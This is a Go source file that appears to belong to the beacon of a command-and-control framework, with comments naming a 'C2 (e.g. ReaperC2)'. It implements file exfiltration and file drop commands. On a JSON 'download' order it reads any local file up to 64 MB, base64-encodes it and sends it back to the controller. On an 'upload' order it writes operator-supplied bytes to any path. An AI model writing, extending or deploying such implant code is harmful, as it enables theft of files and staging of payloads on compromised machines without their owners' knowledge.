package httpclient

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// MaxHTTPBuiltinFileBytes caps read/write for HTTP download/upload built-ins (single command).
const MaxHTTPBuiltinFileBytes = 64 * 1024 * 1024

const scytheDownloadHeader = "SCYTHE_FILE_DOWNLOAD v1"

// splitVerbAndPath splits the first ASCII word (verb) from the rest (path). Path may contain spaces.
func splitVerbAndPath(s string) (verb, path string, ok bool) {
	s = strings.TrimSpace(s)
	i := strings.IndexByte(s, ' ')
	if i < 0 {
		return "", "", false
	}
	return strings.ToLower(strings.TrimSpace(s[:i])), strings.TrimSpace(s[i+1:]), true
}

func builtinHTTPDownload(localPath string) (string, error) {
	localPath = filepath.Clean(localPath)
	if localPath == "" || localPath == "." {
		return "", fmt.Errorf("download: empty path")
	}
	st, err := os.Stat(localPath)
	if err != nil {
		return "", fmt.Errorf("download: %w", err)
	}
	if st.IsDir() {
		return "", fmt.Errorf("download: path is a directory")
	}
	if st.Size() > MaxHTTPBuiltinFileBytes {
		return "", fmt.Errorf("download: file larger than %d bytes", MaxHTTPBuiltinFileBytes)
	}
	data, err := os.ReadFile(localPath)
	if err != nil {
		return "", fmt.Errorf("download: %w", err)
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	var sb strings.Builder
	sb.WriteString(scytheDownloadHeader)
	sb.WriteString("\npath=")
	sb.WriteString(localPath)
	sb.WriteString("\nsize=")
	sb.WriteString(fmt.Sprintf("%d", len(data)))
	sb.WriteString("\nencoding=base64\n\n")
	sb.WriteString(b64)
	sb.WriteString("\n")
	return sb.String(), nil
}

func builtinHTTPUpload(localPath, contentBase64 string) (string, error) {
	localPath = filepath.Clean(strings.TrimSpace(localPath))
	if localPath == "" || localPath == "." {
		return "", fmt.Errorf("upload: empty path")
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(contentBase64))
	if err != nil {
		return "", fmt.Errorf("upload: invalid base64: %w", err)
	}
	if len(raw) > MaxHTTPBuiltinFileBytes {
		return "", fmt.Errorf("upload: payload larger than %d bytes", MaxHTTPBuiltinFileBytes)
	}
	dir := filepath.Dir(localPath)
	if dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return "", fmt.Errorf("upload: mkdir: %w", err)
		}
	}
	if err := os.WriteFile(localPath, raw, 0644); err != nil {
		return "", fmt.Errorf("upload: write: %w", err)
	}
	return fmt.Sprintf("SCYTHE_FILE_UPLOAD v1\npath=%s\nbytes_written=%d\n", localPath, len(raw)), nil
}

// handleHTTPFileCommandMap handles JSON object commands from the C2 (e.g. ReaperC2) for download/upload.
// Supported shapes:
//   {"op":"download","path":"/etc/hostname"}
//   {"download":"/etc/hostname"}
//   {"op":"upload","path":"/tmp/x","content_base64":"..."}
//   {"path":"/tmp/x","content_base64":"..."}  (upload when no download key)
func handleHTTPFileCommandMap(m map[string]interface{}) (output string, err error) {
	if m == nil {
		return "", fmt.Errorf("http file command: nil map")
	}
	// Shorthand: { "download": "/path" }
	if p, ok := m["download"].(string); ok && strings.TrimSpace(p) != "" {
		return builtinHTTPDownload(strings.TrimSpace(p))
	}
	path, _ := m["path"].(string)
	path = strings.TrimSpace(path)
	b64, _ := m["content_base64"].(string)
	if strings.TrimSpace(b64) == "" {
		if v, ok := m["contentBase64"].(string); ok {
			b64 = v
		}
	}
	// Upload: path + base64 payload (optional explicit op)
	op, _ := m["op"].(string)
	op = strings.ToLower(strings.TrimSpace(op))
	if path != "" && strings.TrimSpace(b64) != "" && (op == "" || op == "upload") {
		return builtinHTTPUpload(path, b64)
	}

	switch op {
	case "download":
		if path == "" {
			return "", fmt.Errorf("download: missing path")
		}
		return builtinHTTPDownload(path)
	case "upload":
		if path == "" {
			return "", fmt.Errorf("upload: missing path")
		}
		if strings.TrimSpace(b64) == "" {
			return "", fmt.Errorf("upload: missing content_base64")
		}
		return builtinHTTPUpload(path, b64)
	default:
		return "", fmt.Errorf("http file command: need op download|upload, or {download:path}, or {path, content_base64} for upload")
	}
}

// summarizeHTTPFileCommandForReceive returns JSON for POST /receive "command" without file payloads
// (e.g. content_base64), so the beacon does not echo multi‑megabyte base64 back to the C2.
func summarizeHTTPFileCommandForReceive(m map[string]interface{}) string {
	if m == nil {
		return "{}"
	}
	clone := make(map[string]interface{}, len(m))
	for k, v := range m {
		if k == "content_base64" || k == "contentBase64" {
			continue
		}
		clone[k] = v
	}
	b, err := json.Marshal(clone)
	if err != nil {
		return fmt.Sprintf("%v", m)
	}
	return string(b)
}
